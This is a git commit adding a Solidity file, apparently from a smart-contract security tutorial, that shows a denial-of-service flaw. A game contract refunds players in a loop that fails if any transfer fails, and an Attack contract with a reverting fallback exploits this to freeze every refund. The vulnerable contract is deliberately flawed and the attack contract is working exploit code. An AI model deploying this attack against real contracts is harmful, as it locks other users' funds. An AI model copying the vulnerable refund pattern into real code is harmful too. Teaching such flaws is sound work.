33d05f62329cd56a4050585ab93c1c06d37694b9
Li, Amazing Ang <d0u.gie@hotmail.com>
2022-11-13 14:57:46 +0800

    Create DoS.sol

---
+++ S09_DoS/DoS.sol
@@ -0,0 +1,44 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.4;
+
+// 有DoS漏洞的游戏，玩家们先存钱，游戏结束后，调用deposit退钱。
+contract DoSGame {
+    bool public refundFinished;
+    mapping(address => uint256) public balanceOf;
+    address[] public players;
+
+    function deposit() external payable {
+        require(!refundFinished, "Game Over");
+        require(msg.value > 0, "Please donate ETH");
+        balanceOf[msg.sender] = msg.value;
+        players.push(msg.sender);
+    }
+
+    function refund() external {
+        require(!refundFinished, "Game Over");
+        uint256 pLength = players.length;
+        for(uint256 i; i < pLength; i++){
+            address player = players[i];
+            uint256 refundETH = balanceOf[player];
+            (bool success, ) = player.call{value: refundETH}("");
+            require(success, "Refund Fail!");
+            balanceOf[player] = 0;
+        }
+        refundFinished = true;
+    }
+
+    function balance() external view returns(uint256){
+        return address(this).balance;
+    }
+}
+
+contract Attack {
+    fallback() external payable{
+        revert("DoS Attack!");
+    }
+
+    function attack(address gameAddr) external payable {
+        DoSGame dos = DoSGame(gameAddr);
+        dos.deposit{value: msg.value}();
+    }
+}
